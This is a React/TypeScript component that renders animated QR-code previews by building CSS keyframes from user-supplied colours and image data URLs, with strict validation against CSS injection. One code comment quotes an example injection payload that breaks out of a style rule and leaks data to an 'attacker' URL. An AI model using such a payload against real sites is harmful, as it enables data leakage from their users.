import { useMemo } from 'react';
import type { CSSProperties } from 'react';
import type { StyleData, AnimationLayers } from './qr-types';
import { colorAtPhase, computeLogoTransform } from './qr-export-render';

let instanceCounter = 0;

interface Props {
  layers: AnimationLayers;
  style: StyleData;
  size: number;
}

// CSS injection guard. Every user-controllable value that gets
// concatenated into the dangerouslySetInnerHTML <style> below must pass
// through one of these. Without strict validation, a color value like
//   'red; } body { background: url(http://attacker/?leak); } .x {'
// would escape the rule and execute arbitrary CSS. We reject anything
// not matching the expected shape; one failure short-circuits the whole
// render rather than producing partial / malformed CSS.

const HEX_COLOR = /^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

function validHex(color: string): string | null {
  return HEX_COLOR.test(color) ? color : null;
}

function validPercent(n: number): number | null {
  return Number.isFinite(n) && n >= 0 && n <= 100 ? n : null;
}

function validPositive(n: number): number | null {
  return Number.isFinite(n) && n > 0 ? n : null;
}

// Data URLs from canvas.toDataURL() or FileReader. Anything else is
// rejected so we don't pass arbitrary URLs into mask-image / <img src>
// (which would otherwise permit fetching from any origin or sneaking
// quote chars).
function validDataUrl(url: string): string | null {
  return /^data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+$/.test(url)
    ? url
    : null;
}

export function QrAnimatedPreview({ layers, style, size }: Props) {
  const id = useMemo(() => instanceCounter++, []);

  // Color animation CSS: a div whose animated background shows through the
  // QR alpha mask. Only built when the color track is active.
  const colorCss = useMemo(() => {
    if (!layers.colorMaskUrl || style.animationType === 'none') return '';

    const stops = style.animationStops;
    if (!Array.isArray(stops) || stops.length === 0) return '';

    const validatedStops = stops.map((s) => ({
      color: validHex(s.color),
      position: validPercent(s.position),
      positionEnd: validPercent(s.positionEnd),
      // Raw source object kept available for sampling helpers below; we
      // only construct rgb() / hex literal output from validated values.
      raw: s,
    }));
    if (
      validatedStops.some(
        (s) =>
          s.color === null || s.position === null || s.positionEnd === null,
      )
    ) {
      return '';
    }
    const speed = validPositive(Math.max(style.animationSpeed, 1));
    const validSize = validPositive(size);
    const validMask = validDataUrl(layers.colorMaskUrl);
    if (speed === null || validSize === null || validMask === null) return '';

    const duration = (100 / speed) * 4;
    const v = (i: number) => `--qp${id}-${i}`;

    // Map the user-controlled direction to a fixed set of CSS keywords.
    // Any unexpected input is normalized to 'normal'.
    const dirCss =
      style.animationDirection === 'ccw'
        ? 'reverse'
        : style.animationDirection === 'alt'
          ? 'alternate'
          : 'normal';

    // Whitelist the timing function (CSS-keyword union).
    const timingCss =
      style.animationTimingFunction === 'ease' ||
      style.animationTimingFunction === 'ease-in' ||
      style.animationTimingFunction === 'ease-out' ||
      style.animationTimingFunction === 'ease-in-out'
        ? style.animationTimingFunction
        : 'linear';

    // CSS chunk shared by every type for mask + sizing. Fills the parent
    // (the relatively-positioned wrapper) so the masked layer registers
    // exactly over the logo overlay.
    const maskBlock = `
  position: absolute;
  inset: 0;
  -webkit-mask-image: url("${validMask}");
  mask-image: url("${validMask}");
  -webkit-mask-size: contain;
  mask-size: contain;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  width: 100%;
  height: 100%;`;

    // Uniform-color animations: every pixel of the mask gets the same
    // animated color. Sample the canvas-side phase curve at
    // KEYFRAME_SAMPLES points so the CSS preview matches the exported
    // video.
    if (
      style.animationType === 'pulse' ||
      style.animationType === 'colorCycle'
    ) {
      const KEYFRAME_SAMPLES = 24;
      const colorVar = `--qpc${id}`;
      const isPulse = style.animationType === 'pulse';
      const phaseAt = (t: number) =>
        isPulse ? Math.pow(Math.sin(t * Math.PI), 2) : t;
      const initial = validatedStops[0]!.raw.color;
      const lines: string[] = [];
      for (let i = 0; i <= KEYFRAME_SAMPLES; i++) {
        const t = i / KEYFRAME_SAMPLES;
        const [r, g, b] = colorAtPhase(
          validatedStops.map((s) => s.raw),
          phaseAt(t),
        );
        const pct = (t * 100).toFixed(2);
        lines.push(`  ${pct}% { ${colorVar}: rgb(${r}, ${g}, ${b}); }`);
      }
      return `
@property ${colorVar} {
  syntax: '<color>';
  inherits: false;
  initial-value: ${initial};
}

@keyframes qra${id} {
${lines.join('\n')}
}

.qrag${id} {
  background-color: var(${colorVar});
  animation: ${duration}s qra${id} ${timingCss} ${dirCss} infinite;${maskBlock}
}`;
    }

    // Spiral: conic gradient with an animated `from` angle. Stop
    // positions are static — rotation provides the motion — so we
    // ignore positionEnd.
    if (style.animationType === 'spiral') {
      const angleVar = `--qpa${id}`;
      const gradientStops = validatedStops
        .map((s) => `${s.color} ${s.position}%`)
        .join(', ');
      return `
@property ${angleVar} {
  syntax: '<angle>';
  inherits: false;
  initial-value: 0deg;
}

@keyframes qra${id} {
  0% { ${angleVar}: 0deg; }
  100% { ${angleVar}: 360deg; }
}

.qrag${id} {
  background: conic-gradient(from var(${angleVar}), ${gradientStops});
  animation: ${duration}s qra${id} ${timingCss} ${dirCss} infinite;${maskBlock}
}`;
    }

    // Band-based types: sweep / wave / radialLoop / breathe. Same
    // animated-percentage scheme; what differs is the gradient function.
    const propertyDefs = validatedStops
      .map(
        (s, i) => `@property ${v(i)} {
  syntax: '<percentage>';
  inherits: false;
  initial-value: ${s.position}%;
}`,
      )
      .join('\n');

    const gradientStops = validatedStops
      .map((s, i) => `${s.color} var(${v(i)})`)
      .join(', ');
    const kfFrom = validatedStops
      .map((s, i) => `${v(i)}: ${s.position}%;`)
      .join(' ');
    const kfTo = validatedStops
      .map((s, i) => `${v(i)}: ${s.positionEnd}%;`)
      .join(' ');

    let gradientFunc: string;
    switch (style.animationType) {
      case 'sweep':
        gradientFunc = `repeating-linear-gradient(90deg, ${gradientStops})`;
        break;
      case 'wave':
        gradientFunc = `repeating-linear-gradient(45deg, ${gradientStops})`;
        break;
      default:
        // radialLoop and breathe both use the radial gradient.
        gradientFunc = `repeating-radial-gradient(${gradientStops})`;
        break;
    }

    return `
${propertyDefs}

@keyframes qra${id} {
  0% { ${kfFrom} }
  100% { ${kfTo} }
}

.qrag${id} {
  background: ${gradientFunc};
  animation: ${duration}s qra${id} ${timingCss} ${dirCss} infinite;${maskBlock}
}`;
  }, [layers.colorMaskUrl, style, size, id]);

  // Logo transform animation CSS: keyframes sampled from the same
  // computeLogoTransform() the exports use, so preview and export match.
  const logoCss = useMemo(() => {
    if (!layers.logoLayerUrl || style.logoAnimationType === 'none') return '';
    const speed = validPositive(Math.max(style.logoAnimationSpeed, 1));
    if (speed === null) return '';
    const duration = (100 / speed) * 4;

    const SAMPLES = 24;
    const lines: string[] = [];
    for (let i = 0; i <= SAMPLES; i++) {
      const t = i / SAMPLES;
      const { scaleX, scaleY, opacity } = computeLogoTransform(
        style.logoAnimationType,
        t,
      );
      const pct = (t * 100).toFixed(2);
      lines.push(
        `  ${pct}% { transform: scale(${scaleX.toFixed(4)}, ${scaleY.toFixed(4)}); opacity: ${opacity.toFixed(4)}; }`,
      );
    }
    return `
@keyframes qralogo${id} {
${lines.join('\n')}
}

.qralogo${id} {
  animation: ${duration}s qralogo${id} linear infinite;
  transform-origin: center;
}`;
  }, [
    layers.logoLayerUrl,
    style.logoAnimationType,
    style.logoAnimationSpeed,
    id,
  ]);

  const colorActive = !!colorCss;
  const baseUrl = layers.baseImageUrl
    ? validDataUrl(layers.baseImageUrl)
    : null;
  const logoUrl = layers.logoLayerUrl
    ? validDataUrl(layers.logoLayerUrl)
    : null;

  // Nothing to animate (or the inputs failed validation) — render nothing
  // and let the static canvas show through.
  if (!colorActive && !baseUrl) return null;

  const fill: CSSProperties = {
    position: 'absolute',
    inset: 0,
    width: '100%',
    height: '100%',
    objectFit: 'contain',
  };

  return (
    <div
      style={{
        position: 'relative',
        width: '100%',
        maxWidth: '100%',
        maxHeight: '100%',
        aspectRatio: '1',
      }}
    >
      {colorCss && <style dangerouslySetInnerHTML={{ __html: colorCss }} />}
      {logoCss && <style dangerouslySetInnerHTML={{ __html: logoCss }} />}

      {colorActive ? (
        <div
          className={`qrag${id}`}
          style={
            style.animationSpeed === 0
              ? { animationPlayState: 'paused' }
              : undefined
          }
        />
      ) : baseUrl ? (
        <img src={baseUrl} alt="" style={fill} />
      ) : null}

      {logoUrl && (
        <img
          src={logoUrl}
          alt=""
          className={logoCss ? `qralogo${id}` : undefined}
          style={
            logoCss && style.logoAnimationSpeed === 0
              ? { ...fill, animationPlayState: 'paused' }
              : fill
          }
        />
      )}
    </div>
  );
}
